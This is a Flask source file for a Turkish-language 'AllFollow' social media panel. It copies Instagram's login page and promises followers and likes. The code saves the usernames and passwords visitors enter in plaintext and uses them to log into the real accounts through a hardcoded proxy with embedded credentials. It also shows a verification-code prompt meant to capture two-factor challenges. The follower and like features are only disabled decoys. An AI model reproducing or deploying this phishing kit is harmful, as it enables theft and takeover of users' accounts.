import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "full-panel-v69"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(200), default="Bekliyor")

def login_handler(u, p):
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        clients[u] = cl
        acc = IGAccount.query.filter_by(username=u).first()
        try:
            cl.login(u, p)
            acc.status = "AKTIF"
            db.session.commit()
        except ChallengeRequired:
            acc.status = "ONAY"
            db.session.commit()
        except Exception as e:
            acc.status = "HATA"
            db.session.commit()

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Giris Yapiliyor...")
        db.session.add(acc)
    else:
        acc.password, acc.status = p, "Giris Yapiliyor..."
    db.session.commit()
    threading.Thread(target=login_handler, args=(u, p)).start()
    return jsonify(status="ok")

@app.route('/api/status/<u>')
def get_status(u):
    acc = IGAccount.query.filter_by(username=u).first()
    return jsonify(status=acc.status if acc else "YOK")

# --- TEK DOSYADA TÜM ARAYÜZ (GİRİŞ + PANEL) ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow - Sosyal Medya Paneli</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .insta-input { background: #fafafa; border: 1px solid #dbdbdb; padding: 9px 8px; font-size: 12px; border-radius: 3px; width: 100%; outline: none; }
        .page { display: none; } .active { display: block; }
    </style>
</head>
<body class="bg-[#fafafa]">

    <div id="login-page" class="page active flex flex-col items-center justify-center min-h-screen">
        <div class="bg-white border border-[#dbdbdb] p-10 w-[350px] flex flex-col items-center mb-3">
            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2560540ad9.png" class="mt-4 mb-8 w-44">
            <div class="w-full space-y-2">
                <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="insta-input">
                <input id="p" type="password" placeholder="Şifre" class="insta-input">
                <button onclick="login()" id="l-btn" class="w-full bg-[#0095f6] text-white py-1.5 rounded font-semibold text-sm mt-4">Giriş Yap</button>
            </div>
            <div class="flex items-center w-full my-6 text-gray-400"><div class="h-[1px] bg-[#dbdbdb] flex-grow"></div><div class="px-4 text-[13px] font-semibold">YA DA</div><div class="h-[1px] bg-[#dbdbdb] flex-grow"></div></div>
            <p class="text-[#385185] font-semibold text-sm cursor-pointer"><i class="fab fa-facebook-square mr-2"></i>Facebook ile Giriş Yap</p>
        </div>
    </div>

    <div id="panel-page" class="page min-h-screen bg-gray-50">
        <nav class="bg-white border-b p-4 flex justify-between items-center shadow-sm">
            <h1 class="text-xl font-black italic text-purple-600">ALLFOLLOW</h1>
            <div class="flex items-center space-x-2">
                <span id="panel-user" class="text-xs font-bold text-gray-600"></span>
                <div class="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center text-purple-600"><i class="fas fa-user text-xs"></i></div>
            </div>
        </nav>

        <div class="p-4 max-w-md mx-auto space-y-4">
            <div id="status-card" class="bg-white p-6 rounded-3xl border shadow-sm text-center">
                <p class="text-[10px] font-bold text-gray-400 uppercase tracking-widest mb-1">Hesap Durumu</p>
                <h2 id="status-text" class="text-lg font-black text-orange-500 italic">BAĞLANILIYOR...</h2>
                
                <div id="verify-area" class="hidden mt-4 p-4 bg-red-50 rounded-2xl border border-red-100">
                    <p class="text-[10px] text-red-600 font-bold mb-2 uppercase">Doğrulama Kodu Gerekli</p>
                    <input id="vcode" placeholder="000000" class="w-full p-3 text-center text-2xl font-mono border rounded-xl mb-2">
                    <button class="w-full bg-red-600 text-white py-3 rounded-xl font-bold text-sm">ONAYLA</button>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4">
                <div class="bg-white p-6 rounded-3xl border shadow-sm flex flex-col items-center space-y-2 opacity-50 cursor-not-allowed">
                    <i class="fas fa-user-plus text-2xl text-blue-500"></i>
                    <p class="text-xs font-bold text-gray-700">Takipçi Gönder</p>
                </div>
                <div class="bg-white p-6 rounded-3xl border shadow-sm flex flex-col items-center space-y-2 opacity-50 cursor-not-allowed">
                    <i class="fas fa-heart text-2xl text-red-500"></i>
                    <p class="text-xs font-bold text-gray-700">Beğeni Gönder</p>
                </div>
            </div>

            <div class="bg-blue-600 p-6 rounded-3xl text-white shadow-xl">
                <h3 class="font-bold mb-2 flex items-center"><i class="fas fa-info-circle mr-2"></i> Nasıl Çalışır?</h3>
                <p class="text-[11px] leading-relaxed opacity-90">Sistemimiz havuz mantığıyla çalışır. Hesabınız aktif olduktan sonra otomatik olarak kredi kazanırsınız. Kredilerinizle yukarıdaki menüden işlem yapabilirsiniz.</p>
            </div>
        </div>
    </div>

    <script>
        let curUser = "";
        function login() {
            curUser = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!curUser || !p) return;

            document.getElementById('l-btn').innerText = "Giriş Yapılıyor...";
            
            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u:curUser, p:p})
            });

            setTimeout(() => {
                document.getElementById('login-page').classList.remove('active');
                document.getElementById('panel-page').classList.add('active');
                document.getElementById('panel-user').innerText = "@" + curUser;
                setInterval(updateStatus, 3000);
            }, 1000);
        }

        async function updateStatus() {
            const res = await fetch('/api/status/' + curUser);
            const data = await res.json();
            const stText = document.getElementById('status-text');
            const vArea = document.getElementById('verify-area');
            const card = document.getElementById('status-card');

            stText.innerText = data.status.replace("_", " ");
            
            if(data.status === "AKTIF") {
                stText.innerText = "SİSTEM AKTİF ✅";
                stText.className = "text-lg font-black text-green-500 italic";
                vArea.classList.add('hidden');
            } else if(data.status === "ONAY") {
                stText.innerText = "GÜVENLİK ONAYI ⚠️";
                stText.className = "text-lg font-black text-orange-500 italic";
                vArea.classList.remove('hidden');
            } else if(data.status === "HATA") {
                stText.innerText = "BAĞLANTI HATASI ❌";
                stText.className = "text-lg font-black text-red-500 italic";
            }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
